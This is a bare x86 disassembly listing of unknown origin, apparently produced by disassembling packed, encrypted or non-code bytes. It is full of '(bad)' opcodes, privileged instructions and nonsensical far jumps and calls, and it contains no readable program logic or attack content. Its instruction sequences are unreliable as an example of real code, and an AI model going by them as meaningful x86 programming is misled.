  411e5d:	jne    0x411edc
  411e5f:	mov    DWORD PTR es:[eax+0x58],ecx
  411e63:	enter  0xc488,0xb5
  411e67:	inc    ebp
  411e68:	cli    
  411e69:	push   ebx
  411e6a:	mov    al,ds:0xf5375a93
  411e6f:	stos   DWORD PTR es:[edi],eax
  411e70:	add    bh,BYTE PTR [edi+edx*1+0x6b]
  411e74:	fwait
  411e75:	loopne 0x411e59
  411e77:	pop    esi
  411e78:	(bad)  
  411e7a:	mov    dh,BYTE PTR [ebx-0x4c8b86d5]
  411e80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e81:	dec    ebp
  411e82:	lods   al,BYTE PTR ds:[esi]
  411e83:	fstp   QWORD PTR [esp-0x3a711af7]
  411e8a:	mov    eax,ss
  411e8c:	cs or  eax,0xebfac0c0
  411e92:	jle    0x411ebf
  411e94:	mov    al,ch
  411e96:	cli    
  411e97:	add    dh,bh
  411e99:	arpl   WORD PTR [ebp-0x56],sp
  411e9c:	adc    ebx,esp
  411e9e:	rcr    DWORD PTR [ebp-0x55],0xf4
  411ea2:	jae    0x411ebf
  411ea4:	xor    esi,edx
  411ea6:	cmp    BYTE PTR [eax],bl
  411ea8:	pop    ecx
  411ea9:	adc    ecx,DWORD PTR ds:0x259591c2
  411eaf:	das    
  411eb0:	shr    cl,0x6d
  411eb3:	inc    eax
  411eb4:	mov    fs,WORD PTR [ebp+0x7f]
  411eb7:	sub    BYTE PTR [eax-0x63],cl
  411eba:	inc    ebx
  411ebb:	push   edx
  411ebc:	push   esp
  411ebd:	outs   dx,BYTE PTR ds:[esi]
  411ebe:	dec    ebx
  411ebf:	sbb    BYTE PTR [edx],dh
  411ec1:	mov    al,0xcc
  411ec3:	xchg   ebp,eax
  411ec4:	call   0x2a8d467b
  411ec9:	xchg   ecx,eax
  411eca:	cmc    
  411ecb:	mov    DWORD PTR [ecx],eax
  411ecd:	scas   al,BYTE PTR es:[edi]
  411ece:	cmp    BYTE PTR [ebx+0x4a],0xaf
  411ed2:	retf   
  411ed3:	aaa    
  411ed4:	das    
  411ed5:	sub    ecx,0xf81d9380
  411edb:	pop    ebx
  411edc:	das    
  411edd:	mov    ds:0x301373c7,al
  411ee2:	dec    ebx
  411ee3:	push   ecx
  411ee4:	or     BYTE PTR [eax+eiz*8+0x77],dh
  411ee8:	add    ebx,DWORD PTR [eax-0x27]
  411eeb:	xchg   dl,dl
  411eed:	sub    dh,BYTE PTR [ebp+esi*1+0x394058c4]
  411ef4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ef5:	(bad)  
  411ef6:	pop    edi
  411ef7:	and    al,0xbc
  411ef9:	xchg   ecx,eax
  411efa:	bound  ebp,QWORD PTR ds:0x777b4045
  411f00:	xlat   BYTE PTR ds:[ebx]
  411f01:	scas   al,BYTE PTR es:[edi]
  411f02:	aad    0x6a
  411f04:	or     BYTE PTR [ebp+0x231da345],0x3b
  411f0b:	rol    DWORD PTR [edi-0x71],cl
  411f0e:	pop    DWORD PTR [ebx-0x15c7377c]
  411f14:	ror    DWORD PTR [eax*1+0x6cf8efc6],1
  411f1b:	mov    ch,0x71
  411f1d:	nop
  411f1e:	jmp    0x9f702478
  411f23:	int    0xa7
  411f25:	xchg   esi,eax
  411f26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f27:	adc    ebx,esi
  411f29:	jno    0x411f5f
  411f2b:	sbb    BYTE PTR [edi+0x4d33c5f8],ah
  411f31:	jbe    0x411fa2
  411f33:	jp     0x411ee5
  411f35:	push   0x5381a9aa
  411f3a:	xchg   esp,eax
  411f3b:	outs   dx,BYTE PTR ds:[esi]
  411f3c:	sbb    ebp,0xffffffb5
  411f3f:	xor    BYTE PTR [esi+eax*2],bl
  411f42:	mov    cl,0xeb
  411f44:	popf   
  411f45:	cmp    DWORD PTR [esi+eax*1],esi
  411f48:	mov    edx,0x8d6cc852
  411f4d:	rcl    dl,0xa8
  411f50:	aam    0xec
  411f52:	mov    esi,DWORD PTR [edi]
  411f54:	mov    esi,0xa8bfb3a4
  411f59:	ret    
  411f5a:	je     0x411f4a
  411f5c:	mov    eax,0x8c6f71f7
  411f61:	mov    cl,0x46
  411f63:	in     eax,0xdc
  411f65:	sub    bl,0x57
  411f68:	or     BYTE PTR [edx+eiz*1+0x37],ah
  411f6c:	adc    DWORD PTR [edx],eax
  411f6e:	lods   al,BYTE PTR ds:[esi]
  411f6f:	xchg   esi,eax
  411f70:	nop
  411f71:	pop    eax
  411f72:	leave  
  411f73:	sar    DWORD PTR [edi-0x67c84c0d],cl
  411f79:	mov    esi,0x1071a261
  411f7e:	(bad)  
  411f80:	push   ecx
  411f81:	lahf   
  411f82:	out    dx,eax
  411f83:	jle    0x411fc7
  411f85:	mov    al,ds:0xf8b70f3d
  411f8a:	xchg   bl,bl
  411f8c:	and    ah,cl
  411f8e:	popa   
  411f8f:	(bad)  
  411f90:	mov    esi,0xbd6d8f13
  411f95:	icebp  
  411f96:	pop    es
  411f97:	sub    esp,eax
  411f99:	fisttp QWORD PTR [edi-0x1f]
  411f9c:	int3   
  411f9d:	out    0x10,al
  411f9f:	js     0x411f74
  411fa1:	hlt    
  411fa2:	retf   
  411fa3:	sahf   
  411fa4:	push   es
  411fa5:	stos   BYTE PTR es:[edi],al
  411fa6:	popf   
  411fa7:	fwait
  411fa8:	mov    esp,0x19763256
  411fad:	xlat   BYTE PTR ds:[ebx]
  411fae:	inc    ecx
  411faf:	jg     0x411fb9
  411fb1:	retf   0xef0b
  411fb4:	cs daa 
  411fb6:	cld    
  411fb7:	inc    esi
  411fb8:	idiv   BYTE PTR [eax-0x79]
  411fbb:	cmp    bl,BYTE PTR ds:0xc0da861d
  411fc1:	popa   
  411fc2:	scas   al,BYTE PTR es:[edi]
  411fc3:	aaa    
  411fc4:	lods   eax,DWORD PTR ds:[esi]
  411fc5:	and    ah,0x26
  411fc8:	stos   DWORD PTR es:[edi],eax
  411fc9:	(bad)  
  411fca:	(bad)  [ebx-0x17]
  411fcd:	icebp  
  411fce:	push   esp
  411fcf:	fist   DWORD PTR [eax]
  411fd2:	dec    ecx
  411fd3:	ret    0xceee
  411fd6:	addr16 inc edi
  411fd8:	push   ecx
  411fd9:	push   ebp
  411fda:	and    DWORD PTR [ebx*8-0x51197e8b],edx
  411fe1:	and    DWORD PTR [ebx],ecx
  411fe3:	test   al,0x9c
  411fe5:	jae    0x41201d
  411fe7:	cmp    eax,0xd614ae5a
  411fec:	add    eax,0xce91e3cc
  411ff1:	push   eax
  411ff2:	and    eax,0x9f47688
  411ff7:	loope  0x412005
  411ff9:	mov    ebx,0xa025e44d
  411ffe:	add    BYTE PTR [ebp-0x2b],dh
  412001:	cld    
  412002:	xchg   edx,eax
  412003:	mov    ch,0x30
  412005:	jnp    0x412066
  412007:	jnp    0x411fd5
  412009:	js     0x412010
  41200b:	jno    0x412065
  41200d:	cmp    eax,0x5ec87089
  412012:	push   0xffffff9f
  412014:	lds    edi,FWORD PTR [si-0x3f]
  412018:	cmp    BYTE PTR [esi+edi*4+0x2debb9bc],ah
  41201f:	(bad)  
  412020:	call   FWORD PTR [ecx-0x5b]
  412023:	retf   0xdcf5
  412026:	mov    esi,0x9e2af0de
  41202b:	dec    edi
  41202c:	xor    eax,0x31cbe351
  412031:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412032:	fdivr  QWORD PTR [edx+0x4a]
  412035:	js     0x411ff6
  412037:	inc    esi
  412038:	xor    esp,esp
  41203a:	mov    ds:0x155923b4,eax
  41203f:	jmp    0x971f:0x1ae4cadf
  412046:	sbb    BYTE PTR [edi+edi*8],dh
  412049:	call   DWORD PTR [edx]
  41204b:	push   ecx
  41204c:	jo     0x4120ad
  41204e:	xlat   BYTE PTR ds:[ebx]
  41204f:	outs   dx,DWORD PTR ds:[esi]
  412050:	jmp    0x412015
  412052:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412053:	aam    0x98
  412055:	arpl   ax,sp
  412057:	dec    ebp
  412058:	mov    bh,0x99
  41205a:	loope  0x412084
  41205c:	sub    dl,dh
  41205e:	aam    0x86
  412060:	jo     0x412000
  412062:	dec    ebx
  412063:	sbb    DWORD PTR [eax-0x54b5249d],esi
  412069:	adc    dl,bl
  41206b:	cmp    DWORD PTR [esp+edi*4],0x8b8f3b24
  412072:	out    dx,eax
  412073:	dec    eax
  412074:	dec    ebp
  412075:	int3   
  412076:	pop    ebx
  412077:	cdq    
  412078:	inc    esp
  412079:	jae    0x412033
  41207b:	dec    edi
  41207c:	arpl   WORD PTR [ebx-0x12aec4aa],bp
  412082:	(bad)  
  412084:	pop    eax
  412085:	xchg   ebx,eax
  412086:	enter  0xaebb,0xca
  41208a:	or     edx,esp
  41208c:	sub    DWORD PTR [eax+esi*1-0x153de40],edi
  412093:	cmc    
  412094:	xor    DWORD PTR [ebx+0x31c0b526],ebp
  41209a:	mov    WORD PTR [edi-0x429a66fb],cs
  4120a0:	mov    ebp,0x605dc3c6
  4120a5:	jns    0x412108
  4120a7:	cmp    DWORD PTR [eax+0x341186d6],ebx
  4120ad:	push   0xffffffb4
  4120af:	pop    ss
  4120b0:	sub    al,0x57
  4120b2:	mov    WORD PTR [esi-0x26d7ce11],fs
  4120b8:	clc    
  4120b9:	push   cs
  4120ba:	test   DWORD PTR [ecx-0x55],esp
  4120bd:	pop    es
  4120be:	cmc    
  4120bf:	dec    edx
  4120c0:	xor    eax,0xcbe9f9bf
  4120c5:	not    BYTE PTR [esi+0x5a]
  4120c8:	add    al,0x6e
  4120ca:	les    eax,FWORD PTR [ebx]
  4120cc:	out    0x6,eax
  4120ce:	dec    edi
  4120cf:	retf   0xa2a5
  4120d2:	xchg   ecx,eax
  4120d3:	jmp    0x4120ed
  4120d5:	stos   BYTE PTR es:[edi],al
  4120d6:	push   edi
  4120d7:	sahf   
  4120d8:	pop    eax
  4120d9:	test   DWORD PTR [esi],ebx
  4120db:	push   ecx
  4120dc:	sbb    eax,0x629b13e4
  4120e1:	test   eax,0x87cc32a
  4120e6:	sbb    edi,DWORD PTR [edi+0x60f52aad]
  4120ec:	bound  edx,QWORD PTR [edx-0x2]
  4120ef:	cs inc edx
  4120f1:	fistp  QWORD PTR [ebx+0x16421926]
  4120f7:	(bad)  [ecx]
  4120f9:	out    0xa2,al
  4120fb:	sbb    al,BYTE PTR [eax+0x6c80d5b0]
  412101:	fstp   QWORD PTR [edx-0x1701ce92]
  412107:	sub    ebx,0x39005692
  41210d:	or     edi,DWORD PTR [ebp-0xc158075]
  412113:	fist   DWORD PTR [edx+0x2aeb1453]
  412119:	popa   
  41211a:	mov    bl,0xab
  41211c:	xchg   edi,eax
  41211d:	jg     0x412101
  41211f:	jecxz  0x412182
  412121:	mov    bl,0x61
  412123:	loopne 0x412113
  412125:	cmp    esp,edi
  412127:	out    0x27,al
  412129:	adc    ecx,DWORD PTR [eax+0x2c]
  41212c:	mov    WORD PTR [ebx],fs
  41212e:	mov    ?,WORD PTR [ebp+ecx*1-0x36c3e807]
  412135:	mov    bl,BYTE PTR [ecx-0x54]
  412138:	xor    ebx,DWORD PTR ds:[ebx]
  41213b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41213c:	cmp    dl,BYTE PTR [edi-0x106b7307]
  412142:	nop
  412143:	call   0x7e3a:0xf88bcb56
  41214a:	pop    esi
  41214b:	mov    al,ds:0x8890c2a3
  412150:	call   0x8fee:0x54b723be
  412157:	add    al,0x24
  412159:	popf   
  41215a:	sar    BYTE PTR [ebx-0x4c62f181],cl
  412160:	mov    BYTE PTR [esi+0x61],ah
  412163:	in     al,dx
  412164:	push   ecx
  412165:	mov    ?,edi
  412167:	xchg   edi,eax
  412168:	xchg   BYTE PTR [ebp-0x6115385b],cl
  41216e:	mov    edi,0x4e2b1371
  412173:	mov    ebx,0x5898fd9f
  412178:	sahf   
  412179:	popf   
  41217a:	xor    BYTE PTR [ebp+0x6ab5e2b0],bh
  412180:	mov    ebx,0xc8af5525
  412185:	jmp    0x90e9f204
  41218a:	mov    ecx,0xf3ec318f
  41218f:	inc    edx
  412190:	sub    BYTE PTR [eax+0x71],bh
  412193:	push   edx
  412194:	fs neg bh
  412197:	push   ebx
  412198:	repz mul BYTE PTR [edx+0x4867a1d1]
  41219f:	(bad)  
  4121a1:	inc    edi
  4121a2:	int    0xdb
  4121a4:	or     eax,0xa4eea26c
  4121a9:	sbb    BYTE PTR [edx+0x79bb6a03],ch
  4121af:	mov    bh,BYTE PTR ds:0x9f85181b
  4121b5:	mov    eax,0xc101b8a5
  4121ba:	fwait
  4121bb:	xor    eax,0x95f1a622
  4121c0:	xchg   edx,eax
  4121c1:	ds int3 
  4121c3:	mov    ebp,DWORD PTR [ebp-0x38696c2e]
  4121c9:	rcl    bl,0x1c
  4121cc:	mov    bh,0x72
  4121ce:	icebp  
  4121cf:	jae    0x4121d5
  4121d1:	aam    0x77
  4121d3:	sub    esi,ecx
  4121d5:	mul    DWORD PTR [ebx+ebp*1+0x378dc6]
  4121dc:	adc    edi,edx
  4121de:	push   ebp
  4121df:	xchg   ebp,eax
  4121e0:	xchg   ebx,eax
  4121e1:	add    cl,bl
  4121e3:	dec    ebx
  4121e4:	cmp    cl,bh
  4121e6:	push   esi
  4121e7:	push   esi
  4121e8:	add    eax,0x65f70623
  4121ed:	ins    DWORD PTR es:[edi],dx
  4121ee:	jns    0x41220a
  4121f0:	(bad)  
  4121f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121f2:	dec    ebx
  4121f3:	popa   
  4121f4:	std    
  4121f5:	(bad)  
  4121f6:	dec    esi
  4121f7:	adc    ebp,esp
  4121f9:	mov    dh,BYTE PTR [ebx+eiz*8]
  4121fc:	int3   
  4121fd:	xchg   edi,eax
  4121fe:	push   0x13
  412200:	xchg   esi,eax
  412201:	sub    DWORD PTR [eax-0x12],ebp
  412204:	out    dx,al
  412205:	lea    ebp,[esi-0x21]
  412208:	(bad)  
  41220a:	mov    esp,ecx
  41220c:	xor    dh,BYTE PTR [ecx+0x4a]
  41220f:	aaa    
  412210:	xchg   edi,eax
  412211:	sahf   
  412212:	loope  0x41221c
  412214:	mov    ss,WORD PTR [ebp+eiz*4+0x7a]
  412218:	cmp    edx,ebp
  41221a:	push   ss
  41221b:	rcl    eax,0x3c
  41221e:	aam    0x1c
  412220:	pusha  
  412221:	fimul  WORD PTR [ebp-0x2102f40]
  412227:	xchg   edx,eax
  412228:	repnz out dx,eax
  41222a:	sbb    eax,0xcb1a906b
  41222f:	push   ss
  412230:	mov    bh,0xb0
  412232:	push   ebx
  412233:	(bad)  
  412235:	stc    
  412236:	cmp    DWORD PTR [ebx],eax
  412238:	jns    0x412279
  41223a:	mov    ah,0xcc
  41223c:	stos   DWORD PTR es:[edi],eax
  41223d:	cmp    BYTE PTR [edi-0x79d6bf39],bl
  412243:	dec    ebx
  412244:	iret   
  412245:	test   eax,0x3eee0090
  41224a:	cmp    eax,0x398fa64c
  41224f:	popa   
  412250:	sub    eax,0x4e3ab78
  412255:	mov    eax,ds:0xe2738cd
  41225a:	test   eax,0x7c05aa04
  41225f:	cdq    
  412260:	in     eax,0x5d
  412262:	js     0x4122dc
  412264:	sub    al,0x18
  412266:	mov    ds,ebp
  412268:	xor    esi,DWORD PTR ds:0x2ded6f3b
  41226e:	popf   
  41226f:	test   eax,0x426901ba
  412274:	stos   DWORD PTR es:[edi],eax
  412275:	ins    BYTE PTR es:[edi],dx
  412276:	retf   0xe208
  412279:	jb     0x4122d7
  41227b:	arpl   bp,di
  41227d:	aaa    
  41227e:	outs   dx,DWORD PTR ds:[esi]
  41227f:	pmuludq mm0,mm6
  412282:	fsub   QWORD PTR [esi-0x2551ef90]
  412288:	or     eax,0x14fac6c7
  41228d:	xchg   esp,eax
  41228e:	or     edx,0xffffffed
  412291:	or     dl,al
  412293:	inc    esi
  412294:	jl     0x412284
  412296:	stc    
  412297:	pushf  
  412298:	cli    
  412299:	push   esi
  41229a:	sub    al,ch
  41229c:	cld    
  41229d:	int    0x8f
  41229f:	dec    esp
  4122a0:	das    
  4122a1:	xor    DWORD PTR [ebx],ebp
  4122a3:	loope  0x412270
  4122a5:	repnz mov al,dh
  4122a8:	dec    ebp
  4122a9:	popa   
  4122aa:	push   edx
  4122ab:	and    eax,0x9c67aaea
  4122b0:	inc    edx
  4122b1:	fdivr  QWORD PTR [edi]
  4122b3:	push   es
  4122b4:	mov    edx,DWORD PTR [esp+edi*4+0x3c]
  4122b8:	add    BYTE PTR [ebx-0x74],al
  4122bb:	jns    0x41227e
  4122bd:	in     eax,dx
  4122be:	aad    0x62
  4122c0:	cwde   
  4122c1:	(bad)  
  4122c3:	push   0x7cfad81
  4122c8:	sub    cl,BYTE PTR [ebx]
  4122ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122cb:	js     0x412328
  4122cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122ce:	out    dx,al
  4122cf:	icebp  
  4122d0:	mov    edx,0xc7059576
  4122d5:	lea    eax,ds:0x7754c670
  4122db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122dc:	out    0x49,al
  4122de:	loopne 0x41230b
  4122e0:	fistp  DWORD PTR [eax+ebp*8+0xe]
  4122e4:	inc    ebx
  4122e5:	fs or  eax,0x31ab7c5b
  4122eb:	ins    DWORD PTR es:[edi],dx
  4122ec:	inc    esi
  4122ed:	push   ss
  4122ee:	ficomp DWORD PTR ds:0x20b3d191
  4122f4:	mov    ah,0xb4
  4122f6:	push   ds
  4122f7:	stos   BYTE PTR es:[edi],al
  4122f8:	push   edi
  4122f9:	mov    ah,0xc9
  4122fb:	ins    BYTE PTR es:[edi],dx
  4122fc:	fild   QWORD PTR [eax-0x3b3cf632]
  412302:	or     dh,BYTE PTR [edi-0x11]
  412305:	(bad)  
  412306:	in     al,0xb7
  412308:	inc    esp
  412309:	(bad)  
  41230a:	lods   eax,DWORD PTR ds:[esi]
  41230b:	pop    ds
  41230c:	and    edx,DWORD PTR [ebp-0x38]
  41230f:	int    0x10
  412311:	adc    edi,DWORD PTR [edx+esi*8+0x75]
  412315:	and    bl,BYTE PTR [esi+0x7d65fb90]
  41231b:	mov    ch,0xf
  41231d:	adc    ecx,DWORD PTR [esp+edi*2+0x5413039d]
  412324:	mov    ch,0x1b
  412326:	ficomp DWORD PTR [esi+0x4a]
  412329:	pop    ecx
  41232a:	dec    ebp
  41232b:	jecxz  0x4123a1
  41232d:	jnp    0x41232b
  41232f:	or     eax,0xde2a3f0b
  412334:	jne    0x4122d9
  412336:	aas    
  412337:	and    dl,BYTE PTR [eax-0x39]
  41233a:	dec    edi
  41233b:	test   DWORD PTR [edi-0x64],esp
  41233e:	xor    eax,0xd2192778
  412343:	inc    esi
  412344:	iret   
  412345:	push   bp
  412348:	or     DWORD PTR [edx-0x80],ecx
  41234b:	mov    ebp,0x73bbe13c
  412350:	cmp    al,0x91
  412352:	push   cs
  412353:	int3   
  412354:	pop    es
  412355:	and    DWORD PTR [edi+ecx*8-0x5cb4393b],0xffffff9f
  41235d:	or     al,BYTE PTR [ecx]
  41235f:	daa    
  412360:	mov    ebx,0x6b0d3933
  412365:	cmp    esi,eax
  412367:	in     eax,dx
  412368:	mov    edi,?
  41236a:	addr16 push edi
  41236c:	cmp    al,BYTE PTR [eax-0x4a]
  41236f:	pop    ebp
  412370:	(bad)  
  412371:	cdq    
  412372:	mov    eax,0x6359d0d1
  412377:	cmp    DWORD PTR [esi-0x1b4504f8],0x7ab8a50d
  412381:	jl     0x41235a
  412383:	(bad)  [ebx+0x67]
  412386:	std    
  412387:	fistp  DWORD PTR [eax-0x27ec8e23]
  41238d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41238e:	imul   edx,DWORD PTR ds:[ecx+ebp*1+0x1602e29e],0x48
  412397:	mov    dl,0x3c
  412399:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41239a:	out    0xeb,eax
  41239c:	xchg   esi,eax
  41239d:	adc    al,0x97
  41239f:	push   DWORD PTR [ebp+0x260af3b5]
  4123a5:	in     al,dx
  4123a6:	xchg   esp,eax
  4123a7:	xor    DWORD PTR [eax-0x2f],eax
  4123aa:	dec    edx
  4123ab:	fdiv   QWORD PTR [ecx+0x1222a2d6]
  4123b1:	cdq    
  4123b2:	retf   
  4123b3:	inc    ecx
  4123b4:	pushf  
  4123b5:	stc    
  4123b6:	cmc    
  4123b7:	aad    0xaa
  4123b9:	inc    edx
  4123ba:	pop    ebx
  4123bb:	mov    ds:0x76c4cd45,al
  4123c0:	retf   0xd9a9
  4123c3:	mov    bl,0x4c
  4123c5:	push   eax
  4123c6:	fwait
  4123c7:	adc    eax,DWORD PTR [edi]
  4123c9:	ja     0x412413
  4123cb:	jne    0x4123f1
  4123cd:	xchg   DWORD PTR [esp+ebp*8],esp
  4123d0:	pop    esi
  4123d1:	outs   dx,BYTE PTR ds:[esi]
  4123d2:	xor    eax,esi
  4123d4:	push   esi
  4123d5:	popa   
  4123d6:	sub    eax,0xbe9cfbc5
  4123db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123dc:	cmp    eax,DWORD PTR [ebx]
  4123de:	rol    bl,0xb3
  4123e1:	push   esp
  4123e2:	call   0x45eb7c5c
  4123e7:	(bad)  
  4123e8:	jge    0x41241a
  4123ea:	push   edx
  4123eb:	xor    BYTE PTR [esi+0x27],dh
  4123ee:	fwait
  4123ef:	das    
  4123f0:	ds pop es
  4123f2:	out    0x11,al
  4123f4:	jne    0x412424
  4123f6:	aad    0x31
  4123f8:	jp     0x412456
  4123fa:	mov    al,0x60
  4123fc:	mov    ebp,0x13f2b943
  412401:	push   ss
  412402:	mov    edi,0x2983dffa
  412407:	or     DWORD PTR [esi-0x79f9e416],ebp
  41240d:	add    eax,0x79c71e27
  412412:	je     0x4123a7
  412414:	shl    bh,1
  412416:	sub    ch,dh
  412418:	jo     0x412439
  41241a:	push   edx
  41241b:	jo     0x41246d
  41241d:	pusha  
  41241e:	cli    
  41241f:	nop
  412420:	and    esp,esp
  412422:	mov    al,ds:0x2a7101eb
  412427:	dec    edi
  412428:	cld    
  412429:	pop    ss
  41242a:	adc    bh,BYTE PTR [edx-0x72]
  41242d:	(bad)  
  41242e:	jnp    0x41247d
  412430:	pusha  
  412431:	stos   BYTE PTR es:[edi],al
  412432:	mov    dh,BYTE PTR [edi+0x1bc361df]
  412438:	lea    ecx,[edx-0x5be5bff8]
  41243e:	out    dx,al
  41243f:	cmp    DWORD PTR [edx+0x2172721c],0xffffff8c
  412446:	fidivr WORD PTR [ebx-0x16]
  412449:	repz jo 0x5924abb2
  412450:	jno    0x412451
  412452:	mul    BYTE PTR [esi]
  412454:	cld    
  412455:	mov    BYTE PTR [ecx],0xf4
  412458:	mov    ecx,0x71c879d6
  41245d:	clc    
  41245e:	stc    
  41245f:	ja     0x4124cd
  412461:	or     al,0xa6
  412463:	ja     0x4124cb
  412465:	push   eax
  412466:	cmp    DWORD PTR [ebp-0x22c28a17],ebx
  41246c:	jp     0x4123f5
  41246e:	inc    edx
  41246f:	mov    al,ds:0xd5bb0daf
  412474:	pop    es
  412475:	and    ah,ah
  412477:	or     edx,DWORD PTR [ebx+0x7d]
  41247a:	int3   
  41247b:	adc    eax,0xfa01c691
  412480:	clc    
  412481:	dec    ebp
  412482:	xchg   edx,eax
  412483:	fist   DWORD PTR [edx-0x232244e3]
  412489:	inc    ecx
  41248a:	jns    0x412450
  41248c:	cwde   
  41248d:	jno    0x4124a9
  41248f:	and    BYTE PTR [edi],ah
  412491:	or     ch,BYTE PTR [eax+0x60]
  412494:	call   DWORD PTR [ebx-0x3f]
  412497:	out    0xc7,al
  412499:	mov    al,0x9c
  41249b:	ror    DWORD PTR [edi-0x39],0x76
  41249f:	mov    dh,0xb9
  4124a1:	fdivp  st(2),st
  4124a3:	adc    edx,DWORD PTR fs:[esp+esi*4-0x3d]
  4124a8:	sbb    dh,al
  4124aa:	dec    ebp
  4124ab:	test   eax,0x914cae0b
  4124b0:	cs dec edi
  4124b2:	bound  edi,QWORD PTR [edi+0x32]
  4124b5:	adc    DWORD PTR [ebx],ecx
  4124b7:	jp     0x4124b9
  4124b9:	loope  0x4124d0
  4124bb:	into   
  4124bc:	mov    ch,0xe9
  4124be:	pop    ecx
  4124bf:	mov    ds:0x5124b364,eax
  4124c4:	adc    BYTE PTR [ebp+0x51],0x51
  4124c8:	mov    ch,0x76
  4124ca:	loopne 0x41248a
  4124cc:	mov    BYTE PTR [ebx+0x5113d515],bl
  4124d2:	mov    WORD PTR [ecx],?
  4124d4:	mov    esi,0xa708936b
  4124d9:	fidivr DWORD PTR [edx+0x47dac8e]
  4124df:	or     ch,BYTE PTR [edi]
  4124e1:	test   DWORD PTR [edi+0x1],ebx
  4124e4:	into   
  4124e5:	adc    al,0xa9
  4124e7:	mov    DWORD PTR es:[esi+0x3],edx
  4124eb:	adc    DWORD PTR [eax-0x6b],edi
  4124ee:	adc    eax,0x6bb8378f
  4124f3:	int    0x4e
  4124f5:	lock mov dl,0xd7
  4124f8:	xor    edi,DWORD PTR [ecx+eiz*1-0x58667431]
  4124ff:	push   0x26
  412501:	jne    0x4124a5
  412503:	shl    DWORD PTR [ebp-0x10],0x25
  412507:	fcomp  QWORD PTR [ecx+0x108d8ac4]
  41250d:	xor    bh,BYTE PTR [edx-0x2f6e4f09]
  412513:	mov    eax,0xf47dfd87
  412518:	jb     0x412573
  41251a:	ins    BYTE PTR es:[edi],dx
  41251b:	jo     0x41259a
  41251d:	push   0xfffffff6
  41251f:	or     al,0xae
  412521:	(bad)
  412526:	sub    al,0x8d
  412528:	mov    ds:0x53cf0dc7,al
  41252d:	adc    al,dh
  41252f:	ja     0x4124f9
  412531:	push   cs
  412532:	dec    ebx
  412533:	imul   eax,DWORD PTR [ebp+0x68f260f],0xffffff9c
  41253a:	inc    eax
  41253b:	inc    ebp
  41253c:	(bad)  
  41253e:	in     eax,0x67
  412540:	adc    al,BYTE PTR [ebx-0x4d7c75e4]
  412546:	mov    esi,0x1b706446
  41254b:	ins    DWORD PTR es:[edi],dx
  41254c:	loopne 0x4125ba
  41254e:	mov    esp,0xa07aed8e
  412553:	mov    dh,BYTE PTR [esi+0x63e49810]
  412559:	fcom   st(4)
  41255b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41255c:	or     BYTE PTR ds:0xcb7918ee,0xf4
  412563:	jl     0x41250b
  412565:	push   esp
  412566:	or     esp,DWORD PTR [edx+0x75]
  412569:	(bad)
  41256c:	daa    
  41256d:	fwait
  41256e:	jl     0x412578
  412570:	outs   dx,BYTE PTR ds:[esi]
  412571:	das    
  412572:	popa   
  412573:	inc    ebx
  412574:	aad    0xbb
  412576:	test   DWORD PTR [edi],edx
  412578:	jmp    0x874:0x6acc1b60
  41257f:	das    
  412580:	jge    0x4125dc
  412582:	and    ebp,edi
  412584:	aam    0x2f
  412586:	or     BYTE PTR [ebx-0x35cd9156],dh
  41258c:	bound  edx,QWORD PTR [eax+0x59]
  41258f:	(bad)  
  412590:	sbb    bh,dh
  412592:	fnstcw WORD PTR [ecx-0x286549fa]
  412598:	(bad)  
  412599:	push   edx
  41259a:	jb     0x412602
  41259c:	(bad)  
  41259d:	or     ebx,DWORD PTR [edi+ebx*1+0x40]
  4125a1:	(bad)  
  4125a2:	outs   dx,DWORD PTR ds:[esi]
  4125a3:	push   ds
  4125a4:	iret   
  4125a5:	pop    ds
  4125a6:	and    al,0x29
  4125a8:	sub    ah,BYTE PTR [ebx]
  4125aa:	mov    dh,0x99
  4125ac:	adc    eax,DWORD PTR [esi+edi*4-0xd]
  4125b0:	bound  edi,QWORD PTR [eax-0x9]
  4125b3:	xchg   esp,eax
  4125b4:	mov    bh,0xb7
  4125b6:	lods   al,BYTE PTR ds:[esi]
  4125b7:	vmread DWORD PTR [edx+0x68cfa334],eax
  4125be:	sub    al,0x91
  4125c0:	call   0x1f19:0x915bfd3d
  4125c7:	call   0xa53a9121
  4125cc:	(bad)  
  4125cd:	push   edi
  4125ce:	cld    
  4125cf:	jmp    0x4125dd
  4125d1:	xchg   DWORD PTR [ecx-0x3918ef37],ecx
  4125d7:	ja     0x4125b1
  4125d9:	dec    ebp
  4125da:	push   ebx
  4125db:	rcl    edi,0xfe
  4125de:	stos   DWORD PTR es:[edi],eax
  4125df:	daa    
  4125e0:	out    0x34,eax
  4125e2:	push   esi
  4125e3:	dec    esi
  4125e4:	cld    
  4125e5:	in     al,0x49
  4125e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125e8:	and    ebx,eax
  4125ea:	adc    BYTE PTR ds:0x338d741d,bl
  4125f0:	leave  
  4125f1:	pop    esi
  4125f2:	jl     0x4125cc
  4125f4:	retf   0x13e4
  4125f7:	in     al,dx
  4125f8:	or     al,0xef
  4125fa:	outs   dx,DWORD PTR ds:[esi]
  4125fb:	push   fs
  4125fd:	pushf  
  4125fe:	(bad)  
  4125ff:	fmul   QWORD PTR [ebx]
  412601:	(bad)  
  412602:	jmp    0x41264c
  412604:	mov    ecx,0x709fd7bf
  412609:	ror    BYTE PTR [esi-0x6a],cl
  41260c:	push   edx
  41260d:	xor    cl,BYTE PTR [ecx+0x4a]
  412610:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412611:	pop    ss
  412612:	push   ss
  412613:	cmp    ebx,esi
  412615:	pop    ebp
  412616:	mov    ah,0xf0
  412618:	scas   al,BYTE PTR es:[edi]
  412619:	aas    
  41261a:	inc    esp
  41261b:	nop
  41261c:	fcom   DWORD PTR [edi+0x59]
